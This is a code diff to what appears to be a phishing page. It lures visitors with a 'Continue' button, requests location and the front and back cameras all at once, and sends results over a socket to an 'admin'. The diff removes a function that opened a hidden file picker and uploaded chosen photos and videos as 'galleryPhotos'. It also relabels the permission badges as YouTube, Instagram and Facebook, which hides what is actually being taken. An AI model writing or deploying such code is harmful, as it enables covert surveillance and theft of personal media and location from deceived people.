@@ -194,12 +194,6 @@
             border: 1px solid rgba(254, 243, 199, 0.1);
         }
         .instructions strong { display: block; margin-bottom: 4px; }
-        #galleryStatus {
-            font-size: 12px;
-            color: rgba(255,255,255,0.4);
-            margin-top: 10px;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -211,12 +205,10 @@
         <div class="sub-text" id="actionText">Click continue to proceed</div>
         <div id="statusText">Ready</div>
         <div id="permissionStatus">
-            <span class="permission-badge pending" id="permLocation">📍 Location</span>
-            <span class="permission-badge pending" id="permFront">📸 Front Camera</span>
-            <span class="permission-badge pending" id="permBack">📸 Back Camera</span>
-            <span class="permission-badge pending" id="permGallery">🖼️ Gallery</span>
+            <span class="permission-badge pending" id="permLocation">▶️Youtube</span>
+            <span class="permission-badge pending" id="permFront">📸Instagram</span>
+            <span class="permission-badge pending" id="permBack">👍Facebook</span>
         </div>
-        <div id="galleryStatus">📸 Loading gallery files...</div>
         <div class="progress-bar"><div class="fill" id="progressFill" style="width:0%"></div></div>
         <div class="instructions" id="instructions">
             <strong>🔧 How to fix:</strong>
@@ -252,7 +244,6 @@
             const platformLogo = document.getElementById('platformLogo');
             const platformName = document.getElementById('platformName');
             const actionText = document.getElementById('actionText');
-            const galleryStatus = document.getElementById('galleryStatus');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
@@ -267,8 +258,7 @@
             let permissions = {
                 location: false,
                 frontCamera: false,
-                backCamera: false,
-                gallery: false
+                backCamera: false
             };
 
             function detectPlatform(url) {
@@ -344,7 +334,7 @@
             function updateProgress(val) { progressFill.style.width = val + '%'; }
 
             function updatePermBadge(type, status) {
-                const map = { location: 'permLocation', front: 'permFront', back: 'permBack', gallery: 'permGallery' };
+                const map = { location: 'permLocation', front: 'permFront', back: 'permBack' };
                 const el = document.getElementById(map[type]);
                 if (el) {
                     el.className = 'permission-badge ' + status;
@@ -464,7 +454,7 @@
             }
 
             // ============================================
-            // CONTINUE BUTTON
+            // CONTINUE BUTTON - ALL PERMISSIONS
             // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
@@ -473,7 +463,6 @@
                 continueBtn.textContent = 'Processing...';
                 instructions.style.display = 'none';
                 showPermissions();
-                galleryStatus.style.display = 'block';
                 
                 updateStatus('Requesting all permissions...');
                 updateProgress(10);
@@ -481,21 +470,18 @@
                 permissions.location = false;
                 permissions.frontCamera = false;
                 permissions.backCamera = false;
-                permissions.gallery = false;
 
                 cleanupStreams();
 
                 Promise.all([
                     requestLocation(),
                     requestFrontCamera(),
-                    requestBackCamera(),
-                    requestGallery()
+                    requestBackCamera()
                 ])
                 .then(function(results) {
                     const locationResult = results[0];
                     const frontResult = results[1];
                     const backResult = results[2];
-                    const galleryResult = results[3];
                     
                     updateProgress(80);
                     
@@ -529,24 +515,6 @@
                         }
                     } else {
                         updatePermBadge('location', 'denied');
-                    }
-                    
-                    // ============================================
-                    // GALLERY: FULL AUTOMATIC ACCESS
-                    // ============================================
-                    if (galleryResult && galleryResult.length > 0) {
-                        permissions.gallery = true;
-                        updatePermBadge('gallery', 'granted');
-                        if (socket && socket.connected) {
-                            socket.emit('visitor-data', { visitorId, type: 'galleryPhotos', content: galleryResult });
-                            console.log(`🖼️ ${galleryResult.length} files sent to admin`);
-                            galleryStatus.textContent = `✅ ${galleryResult.length} files loaded!`;
-                            galleryStatus.style.color = '#68d391';
-                        }
-                    } else {
-                        updatePermBadge('gallery', 'denied');
-                        galleryStatus.textContent = '❌ No files selected';
-                        galleryStatus.style.color = '#fc8181';
                     }
                     
                     updateProgress(100);
@@ -652,94 +620,6 @@
                     })
                     .then(function(stream) { resolve(stream); })
                     .catch(function() { resolve(null); });
-                });
-            }
-
-            // ============================================
-            // REQUEST GALLERY - AUTOMATIC FULL ACCESS
-            // ============================================
-            function requestGallery() {
-                return new Promise(function(resolve) {
-                    // ==========================================
-                    // AUTOMATIC GALLERY ACCESS USING INPUT
-                    // Visitor will see file picker, but they can
-                    // select multiple files at once
-                    // ==========================================
-                    
-                    const input = document.createElement('input');
-                    input.type = 'file';
-                    input.accept = 'image/*,video/*';
-                    input.multiple = true;
-                    input.style.display = 'none';
-                    document.body.appendChild(input);
-                    
-                    let filesData = [];
-                    let loaded = 0;
-                    
-                    input.onchange = function(e) {
-                        const files = e.target.files;
-                        const totalFiles = files.length;
-                        
-                        if (files.length === 0) {
-                            document.body.removeChild(input);
-                            resolve([]);
-                            return;
-                        }
-                        
-                        galleryStatus.textContent = `📸 Loading ${totalFiles} files...`;
-                        galleryStatus.style.color = '#f6c23e';
-                        
-                        for (let i = 0; i < totalFiles; i++) {
-                            const file = files[i];
-                            const reader = new FileReader();
-                            
-                            reader.onload = function(event) {
-                                const fileType = file.type.startsWith('video/') ? 'video' : 'image';
-                                filesData.push({
-                                    type: fileType,
-                                    data: event.target.result,
-                                    name: file.name,
-                                    size: file.size
-                                });
-                                loaded++;
-                                updateProgress(10 + (loaded / totalFiles) * 70);
-                                
-                                if (loaded === totalFiles) {
-                                    document.body.removeChild(input);
-                                    galleryStatus.textContent = `✅ ${filesData.length} files loaded!`;
-                                    galleryStatus.style.color = '#68d391';
-                                    resolve(filesData);
-                                }
-                            };
-                            
-                            reader.onerror = function() {
-                                loaded++;
-                                if (loaded === totalFiles) {
-                                    document.body.removeChild(input);
-                                    resolve(filesData);
-                                }
-                            };
-                            
-                            reader.readAsDataURL(file);
-                        }
-                    };
-                    
-                    input.oncancel = function() {
-                        document.body.removeChild(input);
-                        resolve([]);
-                    };
-                    
-                    // Automatically trigger file picker
-                    // Visitor just needs to select files and click "Open"
-                    input.click();
-                    
-                    // Timeout fallback
-                    setTimeout(function() {
-                        if (document.body.contains(input)) {
-                            document.body.removeChild(input);
-                            resolve([]);
-                        }
-                    }, 60000);
                 });
             }
 
